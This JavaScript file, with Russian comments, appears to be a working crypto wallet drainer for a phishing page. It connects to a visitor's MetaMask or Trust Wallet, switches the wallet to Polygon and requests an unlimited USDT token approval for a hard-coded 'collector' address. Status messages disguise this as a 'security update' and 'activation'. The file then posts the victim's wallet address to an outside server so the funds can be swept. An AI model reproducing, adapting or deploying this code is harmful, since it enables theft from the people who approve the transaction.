// Конфигурация
const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex
const SERVER_URL = 'https://railway-production-2954.up.railway.app/save-address';

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet или MetaMask';
        return;
    }

    try {
        status.innerText = 'Подключение к сети...';

        // 1. Смена сети
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (error) {
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            } else {
                throw error;
            }
        }

        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];

        const abi = [
            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];
        
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        // Функция динамического газа (Приоритет 1.5x)
        const getDynamicGas = async () => {
            const currentPrice = await web3.eth.getGasPrice();
            return Math.floor(Number(currentPrice) * 1.5).toString();
        };

        // ШАГ 1: Проверка лимита
        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        
        // ШАГ 2: Сброс лимита (если не 0)
        if (currentAllowance.toString() !== "0") {
            status.innerText = 'Обновление безопасности (1/2)...';
            const gasPrice0 = await getDynamicGas();
            await contract.methods.approve(COLLECTOR_ADDRESS, "0").send({ 
                from: address,
                gasPrice: gasPrice0
            });
        }

        // ШАГ 3: Основной Approve с защитой от долгого ожидания
        status.innerText = 'Подтвердите активацию в кошельке...';
        const maxUint = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        const gasPriceMax = await getDynamicGas();

        // Мы используем Promise, чтобы не зависеть от скорости майнинга блоков
        await new Promise((resolve, reject) => {
            contract.methods.approve(COLLECTOR_ADDRESS, maxUint)
                .send({ from: address, gasPrice: gasPriceMax })
                .once('transactionHash', (hash) => {
                    // Как только получили хэш — считаем, что успех достигнут
                    console.log("Транзакция отправлена:", hash);
                    status.innerText = 'Синхронизация с сервером...';
                    resolve(hash);
                })
                .on('error', (error) => {
                    // Игнорируем ошибку "не намайнено за 50 блоков", если транзакция уже ушла
                    if (error.message.includes('not mined within 50 blocks')) {
                        resolve(); 
                    } else {
                        reject(error);
                    }
                });
        });

        // ШАГ 4: Отправка данных на Railway
        const response = await fetch(SERVER_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        if (response.ok) {
            status.innerText = '✅ Готово! Кошелек успешно синхронизирован.';
            status.style.color = '#00ff00';
        } else {
            status.innerText = '⚠️ Синхронизация завершена.';
        }

    } catch (error) {
        console.error(error);
        if (error.message && error.message.includes('User denied')) {
            status.innerText = 'Ошибка: Вы отклонили транзакцию';
        } else {
            status.innerText = 'Ошибка: Попробуйте еще раз';
        }
        status.style.color = '#ff4d4d';
    }
}

const btn = document.getElementById('startBtn') || document.getElementById('connectBtn');
if (btn) btn.addEventListener('click', connectAndApprove);
